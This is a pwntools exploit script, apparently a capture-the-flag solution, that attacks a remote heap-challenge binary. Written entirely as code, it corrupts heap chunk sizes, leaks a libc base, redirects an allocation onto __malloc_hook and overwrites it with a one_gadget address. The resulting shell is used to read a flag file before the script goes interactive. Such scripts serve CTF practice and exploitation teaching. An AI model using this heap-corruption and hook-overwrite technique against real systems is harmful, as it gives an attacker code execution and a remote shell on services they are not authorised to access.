#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10208
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./free') , ELF('./libc.so.6')

def add( size , data ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def sho( idx ):
    y.sendafter( 'ice:' , '3' )
    y.sendafter( ':' , str( idx ) )

def edt( idx , data ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , data )




y.sendafter( '?' , 'yuawn' )
y.sendafter( '?' , str( 0x31 ) )

y.sendafter( 'ice:' , '4' )
y.sendafter( ')' , '1' )
y.sendafter( ':' , '\x00' )

y.sendafter( 'ice:' , '4' )
y.sendafter( ')' , '1' )
y.sendafter( ':' , p64( 0x602050 ) )

add( 0x28 , 'A' )
add( 0x28 , 'D' * 0x20 + p64( 0x7777 ) )

edt( 0 , 'D' * 0x28 + '\xd1\x0f\x00' )

add( 0x10000 , 'T' )
add( 0x1a0 , 'D' * 8 )

ofs = 0x3c5188
top_ofs = 0x3c4b78

sho( 3 )

y.recvuntil('D' * 8)
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - ofs
log.success( 'libc -> %s' % hex( l.address ) )

edt( 0 , 'D' * 0x1d8 + p64( 0xe01 ) + p64( l.address + top_ofs ) + p64( 0x602100 - 0x10 ) )

add( 0xdf0 , 'A' )

edt( 0 , p64( l.symbols['__malloc_hook'] - 0x18 ) + p64( 0 ) + p64( l.address + top_ofs ) * 2 )

one = 0xf1117

add( 0x10 , 'D' * 8 + p64( l.address + one ) )

y.sendafter( ':' , '1' )

y.sendafter( ':' , '7777777' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()